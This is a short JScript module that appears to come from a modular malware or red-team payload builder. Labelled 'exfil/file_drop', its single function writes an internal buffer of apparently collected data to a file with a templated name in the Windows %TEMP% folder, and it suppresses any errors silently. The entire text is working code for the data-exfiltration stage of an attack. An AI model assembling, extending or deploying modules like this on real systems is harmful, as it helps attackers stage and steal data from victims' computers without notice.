// chunk: exfil/file_drop
// depends: core/emit_buffer, core/file_ops
// provides: exfil_file
// format: jscript

function exfil_file() {
    var out = _s.ExpandEnvironmentStrings("%TEMP%") + "\\{{EXFIL_FILENAME}}";
    try {
        var f = _fso.CreateTextFile(out, true);
        f.Write(_buf);
        f.Close();
    } catch(ex) {}
}
